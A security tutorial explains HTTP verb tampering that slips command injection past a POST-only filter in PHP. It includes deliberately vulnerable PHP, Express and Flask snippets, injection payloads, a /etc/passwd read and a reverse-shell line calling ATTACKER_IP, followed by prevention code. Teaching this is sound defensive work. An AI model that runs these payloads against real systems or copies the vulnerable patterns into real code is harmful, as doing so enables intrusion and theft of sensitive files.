# Bypassing Security Filters via HTTP Verb Tampering

This variant of verb tampering is more dangerous in practice than the authentication bypass because it silently undermines security controls that developers believe are working correctly. The filter is functioning, the injection is blocked on the tested path, and no alarm is raised. The vulnerability exists in the gap between what the filter checks and what the application actually processes.

***

## The Root Cause

Security filters in web applications are frequently written to check input from a specific HTTP method's parameter superglobal rather than checking all possible input sources. A developer who writes a filter against POST injection rarely considers that the same endpoint might also accept and process GET parameters, or that the underlying query might pull from a combined source like `$_REQUEST`:

```php
// Developer writes a filter for POST requests
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (preg_match('/[^A-Za-z0-9\s]/', $_POST['filename'])) {
        die("Malicious Request Denied!");
    }
}

// But the actual file operation uses $_REQUEST, which includes GET
system("touch " . $_REQUEST['filename']);
```

The filter runs on POST. Switch to GET and the filter block never executes, but the `system()` call still receives and processes the GET parameter.

***

## Step-by-Step Exploitation

### Step 1: Confirm the Filter is Active

Submit a payload with special characters via the normal POST request to confirm the filter is present and functioning:

```
filename = test;
Result: "Malicious Request Denied!"
```

This confirms a security filter exists on the back-end for POST requests.

### Step 2: Change the Request Method

Intercept the POST request in Burp and switch the method to GET. Move the parameters from the POST body to the URL query string:

```http
-- Before (blocked) --
POST /filemanager/create.php HTTP/1.1
Host: target.com

filename=test%3B

-- After (bypassed) --
GET /filemanager/create.php?filename=test%3B HTTP/1.1
Host: target.com
```

If the server returns success without the "Malicious Request Denied!" message, the filter is confirmed to only cover POST requests.

### Step 3: Escalate to Command Injection

A bypassed input filter means whatever vulnerability it was protecting is now directly exploitable. Test command injection with a payload that produces observable side effects:

```bash
# Payload that creates two files to confirm execution
file1; touch file2;

# URL-encoded in GET request:
GET /filemanager/create.php?filename=file1%3B+touch+file2%3B HTTP/1.1
```

If both `file1` and `file2` appear in the file listing, command injection is confirmed. The semicolons that the POST filter would have blocked passed through the GET path untouched.

### Step 4: Progress to Full Command Execution

With command injection confirmed:

```bash
# Confirm RCE with id
file1; id > /var/www/html/output.txt;

# Reverse shell
file1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';

# Read sensitive files
file1; cat /etc/passwd > /var/www/html/passwd.txt;
```

***

## Why This Pattern is So Common

The insecure coding pattern appears in several recognisable forms across different frameworks:

```php
// PHP: filter checks $_POST, query uses $_REQUEST
if (isset($_POST['param'])) {
    validateInput($_POST['param']); // only POST is checked
}
db_query($_REQUEST['param']); // GET or POST both reach here

// PHP: filter checks one superglobal, logic uses another
if (isClean($_GET['id'])) {       // only GET checked
    $result = fetch($_POST['id']); // POST used in logic
}
```

```javascript
// Express.js: filter on req.body, execution uses req.query
if (req.method === 'POST') {
    sanitise(req.body.filename);
}
fs.writeFile(req.query.filename, data); // query always accessible
```

```python
# Flask: filter on form data, execution uses request.values (merged)
if request.method == 'POST':
    validate(request.form.get('cmd'))
os.system(request.values.get('cmd'))  # values = form + query string combined
```

In each case the developer checked one input source and executed using a broader one. Changing the HTTP method routes the attacker's input past the narrower check and straight into the execution path.

***

## Prevention

The fix requires consistent input handling across all methods and explicit verb restriction:

```php
// Secure: validate from the same source used in execution
$filename = $_POST['filename'] ?? '';  // Only accept POST
if (!preg_match('/^[A-Za-z0-9_-]+$/', $filename)) {
    die("Invalid input");
}
system("touch " . escapeshellarg($filename));

// Also restrict accepted methods at the application level
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die("Method Not Allowed");
}
```

```apache
# Server-level: restrict endpoint to POST only
<Location /filemanager/create.php>
    <LimitExcept POST OPTIONS>
        Require all denied
    </LimitExcept>
</Location>
```

The three rules that prevent this class of vulnerability entirely:

1. Validate input from the exact same variable used in execution, never a broader superglobal
2. Explicitly check and restrict the HTTP method at the start of every sensitive function
3. Apply security filters to all input sources simultaneously, not just the expected method's parameters
